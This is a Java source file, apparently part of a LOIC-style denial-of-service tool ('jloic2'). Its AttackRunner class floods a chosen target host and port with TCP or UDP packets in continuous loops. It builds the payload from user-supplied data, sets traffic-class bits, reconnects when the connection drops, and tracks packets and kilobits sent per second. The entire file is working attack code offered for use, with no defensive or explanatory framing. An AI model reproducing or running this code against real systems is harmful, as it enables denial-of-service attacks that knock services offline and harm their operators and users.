/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package jloic2;
import java.net.*;
import java.io.*;
import java.nio.*;
import java.lang.*;
import java.util.*;
/**
 *
 * @author Administrator
 */

class PacketsStat extends TimerTask
{
    AttackStats Stats;
    AttackStats Last;
    double PSize;
    PacketsStat(AttackStats s, int l)
    {
        this.Stats = s;
        this.PSize = l;
        Last = new AttackStats();
    }
    public void run()
    {
        Stats.KbitPerSec = ((Stats.PacketsSent - Last.PacketsSent) * PSize)/1000;
        Stats.PksPerSec = (Stats.PacketsSent - Last.PacketsSent);
        Stats.KbitsSent += ((Stats.PacketsSent - Last.PacketsSent) * PSize)/1000;
        Last.KbitPerSec = Stats.KbitPerSec;
        Last.PacketsSent = Stats.PacketsSent;
        Last.PksPerSec = Stats.PksPerSec;
    }
};
public class AttackRunner extends Thread
{
   AttackInformation AtkInfo;
   AttackStats  stats;
   byte[] Payload;
   int TOS;
   IsFiring isf;
   AttackRunner(AttackInformation AtkInfo, IsFiring isf)
   {
        this.isf = isf;
        this.AtkInfo = new AttackInformation(AtkInfo);
        this.stats = new AttackStats();
        int l = 0;
        if (this.AtkInfo.p.FHPData != null)
            l += this.AtkInfo.p.FHPData.length;
        if (this.AtkInfo.p.FDPData != null)
            l += this.AtkInfo.p.FDPData.length;
        if (this.AtkInfo.p.TextPayload.length() > 0)
            l +=  this.AtkInfo.p.TextPayload.length();
        if (l == 0)
        {
            l = 32;
            Payload = new byte[l];
        }
        else
        {
            Payload = new byte[l];
            int n = 0;
            if (this.AtkInfo.p.FHPData != null)
            {
                System.arraycopy(this.AtkInfo.p.FHPData, 0, Payload, 0,  this.AtkInfo.p.FHPData.length);
                n += this.AtkInfo.p.FHPData.length;
            }
            if (this.AtkInfo.p.FDPData != null)
            {
                System.arraycopy(this.AtkInfo.p.FDPData, 0, Payload, n,  this.AtkInfo.p.FDPData.length);
                n += this.AtkInfo.p.FDPData.length;
            }
            if (this.AtkInfo.p.TextPayload.length() > 0)
            {
                System.arraycopy(this.AtkInfo.p.TextPayload.getBytes(), 0, Payload, n,  this.AtkInfo.p.TextPayload.getBytes().length);
            }
        }
        TOS = 0xE0;
        if (this.AtkInfo.Delay)
            TOS = TOS | 0x10;
        if (this.AtkInfo.ThroughPut)
            TOS = TOS | 0x08;
        if (this.AtkInfo.Reliability)
            TOS = TOS | 0x04;
            
   }
   public void run()
   {
       if (this.AtkInfo.M.m == Methodl4.Method.TCP)
           TCPAttack();
       else
           UDPAttack();
   }
   
   void TCPAttack()
   {
       Socket s = null;
       SocketAddress endpoint = null;
       OutputStream writer = null;
       Timer timer = new Timer();
       TimerTask task = null;
       try
       {
       s = new Socket(this.AtkInfo.Target, this.AtkInfo.Port);
       } catch (UnknownHostException e)
       {} catch (IOException b) {}
       try
       {
           s.setTrafficClass(TOS);
           s.setTcpNoDelay(true);
           s.setKeepAlive(false);
           s.setSendBufferSize(this.AtkInfo.SendBuffer);
       } catch(SocketException e) {   }
       try
       {
       writer = s.getOutputStream();
       } catch (IOException e) {}
       endpoint = s.getRemoteSocketAddress();
       task = new PacketsStat(this.stats, this.Payload.length);
       timer.schedule(task, 100, 1000);
       while(isf.IsFiring)
       {
        try{
         while(isf.IsFiring)
         {
                 writer.write(this.Payload);
                 this.stats.PacketsSent++;
                 if(this.AtkInfo.Speed > 0)
                 {
                     try
                     {
                         this.sleep(this.AtkInfo.Speed/10);
                     } catch (InterruptedException e){}
                 }
         }
         }catch (IOException e) { }
        try{
        s.connect(endpoint);
        } catch (IOException e) {}
       }
   }
   void UDPAttack()
   {
       DatagramSocket socket = null;
       DatagramPacket packet = new DatagramPacket(this.Payload, this.Payload.length);
       InetAddress addr = null;
       Timer timer = new Timer();
       TimerTask task = null;
       try
       {
           addr = InetAddress.getByName(this.AtkInfo.Target);
       } catch (UnknownHostException e) {}
       try
       {
           socket = new DatagramSocket();
       }catch(SocketException e ){}
       socket.connect(addr, this.AtkInfo.Port);
       try
       {
           socket.setTrafficClass(TOS);
           socket.setSendBufferSize(this.AtkInfo.SendBuffer);
       } catch(SocketException e) {   }
       task = new PacketsStat(this.stats, this.Payload.length);
       timer.schedule(task, 100, 1000);
       while(isf.IsFiring)
       {
           try
           {
               socket.send(packet);
               this.stats.PacketsSent++;
           } catch (IOException e) { }
           if(this.AtkInfo.Speed > 0)
           {
               try
               {
                   this.sleep(this.AtkInfo.Speed/10);
               } catch (InterruptedException e){}
           }
       }
   }
}
